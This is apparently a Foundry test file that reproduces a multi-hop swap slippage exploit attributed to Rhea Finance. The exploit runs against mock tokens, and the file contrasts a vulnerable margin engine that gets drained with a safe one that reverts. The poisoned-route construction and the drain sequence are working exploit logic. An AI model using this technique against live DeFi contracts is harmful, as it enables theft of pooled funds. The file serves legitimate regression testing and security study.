// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, SwapAction} from "../src/rhea/SwapRoute.sol";
import {Router} from "../src/rhea/Router.sol";
import {VulnerableMarginEngine, SafeMarginEngine} from "../src/rhea/MarginEngine.sol";

/// PoC for the Rhea Finance / Burrowland multi-hop slippage exploit (2026-04-16, $18.4M).
///   forge test --match-contract RheaSlippage -vvv
///
/// Invariant that SHOULD hold (master-checklist SC02-SWAP-1):
///   the validated minimum output of a multi-hop swap route must equal the actual
///   TERMINAL output, not the sum of every intermediate hop's minimum. And the engine
///   must compare what actually arrived against that minimum before crediting collateral.
/// The attack breaks it: a route bouncing through USDC inflates the validated minimum
/// far above what the route really pays, so the engine credits collateral out of thin
/// air and the attacker withdraws the reserve.
///
/// See docs/exploits/rhea-finance-slippage-2026-04-16.md
contract RheaSlippageTest is Test {
    MockERC20 zec; // collateral token swapped in
    MockERC20 usdc; // engine reserve / position-credit token
    Router router;

    address attacker = makeAddr("attacker");

    uint256 constant RESERVE = 1_000_000e6; // engine's real USDC reserve
    uint256 constant DEPOSIT = 1e18; // attacker's tiny collateral input
    uint256 constant REAL_OUT = 1e6; // what the fabricated route truly returns (~nothing)

    function setUp() public {
        zec = new MockERC20();
        usdc = new MockERC20();
        router = new Router(IERC20(address(zec)), IERC20(address(usdc)));
        router.setRealOut(REAL_OUT);
        usdc.mint(address(router), REAL_OUT); // router can pay out the (tiny) real output
        zec.mint(attacker, DEPOSIT);
    }

    /// A poisoned route: 6 hops bouncing through USDC, each declaring a 200k-USDC floor.
    /// Real terminal output is REAL_OUT. The honest terminal floor is the last hop.
    function _poisonedRoute() internal pure returns (SwapAction[] memory route) {
        route = new SwapAction[](6);
        for (uint256 i = 0; i < route.length; i++) {
            route[i] = SwapAction({minAmountOut: 200_000e6});
        }
        // Summed = 1,200,000e6 (> the whole reserve); terminal-only = 200,000e6.
    }

    function test_vulnerableEngine_isDrained() public {
        VulnerableMarginEngine engine =
            new VulnerableMarginEngine(IERC20(address(zec)), IERC20(address(usdc)), router);
        usdc.mint(address(engine), RESERVE);

        vm.startPrank(attacker);
        zec.approve(address(engine), type(uint256).max);
        engine.openTrade(DEPOSIT, _poisonedRoute());

        // Engine summed the per-hop minimums -> credited 1.2M USDC collateral for a
        // deposit whose route really returned REAL_OUT. Attacker withdraws the reserve.
        uint256 credited = engine.collateral(attacker);
        console2.log("collateral credited (USDC):", credited / 1e6);
        engine.withdraw(RESERVE);
        vm.stopPrank();

        assertEq(usdc.balanceOf(attacker), RESERVE, "attacker drained the reserve");
        assertEq(usdc.balanceOf(address(engine)), REAL_OUT, "engine reserve emptied");
        assertGt(credited, RESERVE, "validated minimum was inflated above the reserve");
    }

    function test_safeEngine_resistsAttack() public {
        SafeMarginEngine engine =
            new SafeMarginEngine(IERC20(address(zec)), IERC20(address(usdc)), router);
        usdc.mint(address(engine), RESERVE);

        vm.startPrank(attacker);
        zec.approve(address(engine), type(uint256).max);

        // Safe engine validates only the terminal minimum (200k) against the actual
        // output (REAL_OUT) -> post-swap check rejects the fabricated route.
        vm.expectRevert(bytes("slippage: output below minimum"));
        engine.openTrade(DEPOSIT, _poisonedRoute());
        vm.stopPrank();

        assertEq(usdc.balanceOf(address(engine)), RESERVE, "reserve untouched");
        assertEq(engine.collateral(attacker), 0, "no phantom collateral credited");
        assertEq(usdc.balanceOf(attacker), 0, "attacker gained nothing");
    }
}
